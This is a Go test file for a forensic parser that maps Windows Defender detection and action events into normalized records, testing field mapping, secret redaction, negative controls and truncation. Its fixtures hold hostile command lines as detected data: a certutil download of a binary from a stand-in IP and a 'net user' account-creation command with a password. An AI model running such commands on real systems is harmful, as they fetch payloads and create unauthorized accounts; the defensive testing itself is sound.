package winevent_test

import (
	"fmt"
	"strings"
	"testing"

	"tracefall/internal/evtx/evtxgen"
	"tracefall/internal/model"
	"tracefall/internal/parsers/winevent"
)

const (
	avChannel  = "Microsoft-Windows-Windows Defender/Operational"
	avProvider = "Microsoft-Windows-Windows Defender"
	avCmdRes   = `CmdLine:_C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.bin c:\windows\temp\a.bin`
)

// avData is the EventData layout of the Defender Operational log: the names
// are the manifest's own, with spaces, as read from a real record.
func avData(overrides map[string]string) map[string]string {
	d := map[string]string{
		"Product Name": "Antimalware Product", "Product Version": "4.18.0.1",
		"Detection ID": "{AAAAAAAA-0000-4000-8000-000000000001}", "Detection Time": "2026-01-15T09:15:00.000Z",
		"Threat ID": "2147000001", "Threat Name": "Trojan:Win32/Example.A",
		"Severity ID": "5", "Severity Name": "Severe", "Category ID": "8", "Category Name": "Trojan",
		"Status Code": "1", "State": "1", "Source Name": "System", "Process Name": "Unknown",
		"Detection User": `HOST01\alice`, "Path": avCmdRes,
		"Origin Name": "Unknown", "Execution Name": "Unknown", "Type Name": "Concrete",
		"Action ID": "9", "Action Name": "Not Applicable",
		"Error Code": "0x00000000", "Error Description": "The operation completed successfully.",
		"Remediation User": "", "Security intelligence Version": "AV: 1.0.0.0", "Engine Version": "AM: 1.1.0.0",
	}
	for k, v := range overrides {
		d[k] = v
	}
	return d
}

func avEvent(rec uint64, id int, data map[string]string) evtxgen.Event {
	return evtxgen.Event{RecordID: rec, Timestamp: crossTime, Computer: "host01", Channel: avChannel, Provider: avProvider, EventID: id, Data: data}
}

func TestDefenderDetection1116MapsTheRecordedFields(t *testing.T) {
	evs := parseNative(t, []evtxgen.Event{avEvent(1, 1116, avData(nil))})
	if len(evs) != 1 {
		t.Fatalf("mapped %d, want 1", len(evs))
	}
	e := evs[0]
	if e.EventType != model.EventAntimalwareDetection {
		t.Fatalf("type = %q", e.EventType)
	}
	want := map[string]string{
		"threat_name": "Trojan:Win32/Example.A", "threat_id": "2147000001",
		"severity_name": "Severe", "severity_id": "5", "category_name": "Trojan", "category_id": "8",
		"detection_id": "{AAAAAAAA-0000-4000-8000-000000000001}", "resource": avCmdRes, "resource_kind": "command_line",
		"action_name": "Not Applicable", "action_id": "9", "error_code": "0x00000000",
		"detection_user": `HOST01\alice`, "detection_time_recorded": "2026-01-15T09:15:00.000Z",
		"process_name_recorded": "Unknown", "source_name": "System",
	}
	for k, v := range want {
		if e.Extra[k] != v {
			t.Errorf("Extra[%s] = %q, want %q", k, e.Extra[k], v)
		}
	}
	// A CmdLine resource is a command-line string. It must not look like a
	// process start or a file to any rule that reads those fields.
	if e.CommandLine != "" || e.FilePath != "" || e.ProcessName != "" || e.ProcessPath != "" {
		t.Errorf("resource leaked into process/file fields: cmd=%q file=%q proc=%q", e.CommandLine, e.FilePath, e.ProcessName)
	}
	for _, need := range []string{"command-line string", "not a file", "does not show"} {
		if !strings.Contains(e.Extra["limitations"], need) {
			t.Errorf("limitations lack %q: %q", need, e.Extra["limitations"])
		}
	}
	if !strings.Contains(e.Extra["evidence_meaning"], "detected") {
		t.Errorf("evidence_meaning = %q", e.Extra["evidence_meaning"])
	}
}

func TestDefenderAction1117DoesNotClaimTheOtherPathSucceeded(t *testing.T) {
	d := avData(map[string]string{"Action ID": "3", "Action Name": "Remove", "State": "2", "Status Code": "4", "Remediation User": `NT AUTHORITY\SYSTEM`})
	evs := parseNative(t, []evtxgen.Event{avEvent(2, 1117, d)})
	if len(evs) != 1 || evs[0].EventType != model.EventAntimalwareAction {
		t.Fatalf("%+v", evs)
	}
	e := evs[0]
	if e.Extra["action_name"] != "Remove" || e.Extra["error_code"] != "0x00000000" || e.Extra["remediation_user"] != `NT AUTHORITY\SYSTEM` {
		t.Errorf("fields: %+v", e.Extra)
	}
	if e.Extra["action_outcome"] != "action_reported" {
		t.Errorf("action_outcome = %q", e.Extra["action_outcome"])
	}
	l := e.Extra["limitations"]
	for _, need := range []string{"antimalware action", "not", "transfer", "command", "recovered"} {
		if !strings.Contains(l, need) {
			t.Errorf("limitations lack %q: %q", need, l)
		}
	}
}

func TestDefenderFailedActions1118And1119(t *testing.T) {
	for _, tc := range []struct {
		id      int
		outcome string
	}{{1118, "action_failed"}, {1119, "action_failed_critical"}} {
		t.Run(fmt.Sprint(tc.id), func(t *testing.T) {
			d := avData(map[string]string{"Action Name": "Quarantine", "Error Code": "0x80508023", "Error Description": "The program could not find the malware and other potentially unwanted software on this computer."})
			evs := parseNative(t, []evtxgen.Event{avEvent(3, tc.id, d)})
			if len(evs) != 1 || evs[0].EventType != model.EventAntimalwareAction {
				t.Fatalf("%+v", evs)
			}
			if evs[0].Extra["action_outcome"] != tc.outcome || evs[0].Extra["error_code"] != "0x80508023" {
				t.Errorf("%+v", evs[0].Extra)
			}
		})
	}
}

func TestDefenderFileResourceKind(t *testing.T) {
	evs := parseNative(t, []evtxgen.Event{avEvent(4, 1116, avData(map[string]string{"Path": `file:_C:\Users\alice\Downloads\x.bin`}))})
	if len(evs) != 1 || evs[0].Extra["resource_kind"] != "file" {
		t.Fatalf("%+v", evs)
	}
	if evs[0].FilePath != "" {
		t.Errorf("a detected file is not asserted as a file the host wrote; FilePath = %q", evs[0].FilePath)
	}
}

func TestDefenderResourceIsRedacted(t *testing.T) {
	d := avData(map[string]string{"Path": `CmdLine:_C:\Windows\System32\cmd.exe /c net user bob Hunter2xyz /add`})
	evs := parseNative(t, []evtxgen.Event{avEvent(5, 1116, d)})
	if len(evs) != 1 {
		t.Fatalf("mapped %d, want 1", len(evs))
	}
	e := evs[0]
	for k, v := range e.Extra {
		if strings.Contains(v, "Hunter2xyz") {
			t.Errorf("secret survives in Extra[%s]=%q", k, v)
		}
	}
}

// Negative controls: a benign configuration event, the same IDs under another
// provider or channel, and a record with none of the detection fields.
func TestDefenderNegativeControls(t *testing.T) {
	for name, rec := range map[string]evtxgen.Event{
		"config change 5007": {RecordID: 6, Timestamp: crossTime, Computer: "host01", Channel: avChannel, Provider: avProvider, EventID: 5007,
			Data: map[string]string{"Old Value": "a", "New Value": "b"}},
		"scan started 1000":   {RecordID: 7, Timestamp: crossTime, Computer: "host01", Channel: avChannel, Provider: avProvider, EventID: 1000, Data: avData(nil)},
		"1116 other provider": {RecordID: 8, Timestamp: crossTime, Computer: "host01", Channel: avChannel, Provider: "Some-Other-Provider", EventID: 1116, Data: avData(nil)},
		"1116 other channel":  {RecordID: 9, Timestamp: crossTime, Computer: "host01", Channel: "Application", Provider: avProvider, EventID: 1116, Data: avData(nil)},
		"1117 in Security":    {RecordID: 10, Timestamp: crossTime, Computer: "host01", Channel: "Security", Provider: "Microsoft-Windows-Security-Auditing", EventID: 1117, Data: avData(nil)},
		"1116 without fields": {RecordID: 11, Timestamp: crossTime, Computer: "host01", Channel: avChannel, Provider: avProvider, EventID: 1116, Data: map[string]string{"Product Name": "x"}},
	} {
		t.Run(name, func(t *testing.T) {
			if evs := parseNative(t, []evtxgen.Event{rec}); len(evs) != 0 {
				t.Fatalf("mapped %d events: %+v", len(evs), evs[0].EventType)
			}
		})
	}
}

// 30 detection records over a few detection IDs must stay 30 distinct events:
// the ID is carried for grouping and never merges records.
func TestDefenderRecordsSharingADetectionIDStayDistinct(t *testing.T) {
	id := map[string]string{"Detection ID": "{AAAAAAAA-0000-4000-8000-0000000000FF}"}
	evs := parseNative(t, []evtxgen.Event{
		avEvent(20, 1116, avData(id)), avEvent(21, 1116, avData(id)), avEvent(22, 1117, avData(id)),
	})
	if len(evs) != 3 {
		t.Fatalf("got %d, want 3", len(evs))
	}
	seen := map[string]bool{}
	for _, e := range evs {
		if e.Extra["detection_id"] != id["Detection ID"] {
			t.Errorf("detection_id = %q", e.Extra["detection_id"])
		}
		h := e.ComputeDedupHash()
		if seen[h] {
			t.Error("records share a dedup hash")
		}
		seen[h] = true
	}
}

func TestDefenderMappingIsDirectNormalize(t *testing.T) {
	ev := model.Event{Extra: map[string]string{}}
	ok := winevent.Normalize(&ev, winevent.Input{Channel: avChannel, Provider: avProvider, EventID: 1116, Data: avData(nil)})
	if !ok || ev.EventType != model.EventAntimalwareDetection {
		t.Fatalf("ok=%v type=%q", ok, ev.EventType)
	}
}

func TestDefenderBarePathIsNotGivenAScheme(t *testing.T) {
	evs := parseNative(t, []evtxgen.Event{avEvent(30, 1116, avData(map[string]string{"Path": `C:\Users\alice\x.bin`}))})
	if len(evs) != 1 {
		t.Fatalf("mapped %d", len(evs))
	}
	if evs[0].Extra["resource_kind"] != "other" || evs[0].Extra["resource_scheme"] != "" {
		t.Errorf("kind=%q scheme=%q", evs[0].Extra["resource_kind"], evs[0].Extra["resource_scheme"])
	}
}

func TestDefenderOversizedResourceIsBoundedAndSaid(t *testing.T) {
	big := "CmdLine:_" + strings.Repeat("A", 20000)
	evs := parseNative(t, []evtxgen.Event{avEvent(31, 1116, avData(map[string]string{"Path": big}))})
	if len(evs) != 1 {
		t.Fatalf("mapped %d", len(evs))
	}
	if len(evs[0].Extra["resource"]) > 2048 || evs[0].Extra["resource_truncated"] != "true" {
		t.Errorf("len=%d truncated=%q", len(evs[0].Extra["resource"]), evs[0].Extra["resource_truncated"])
	}
}
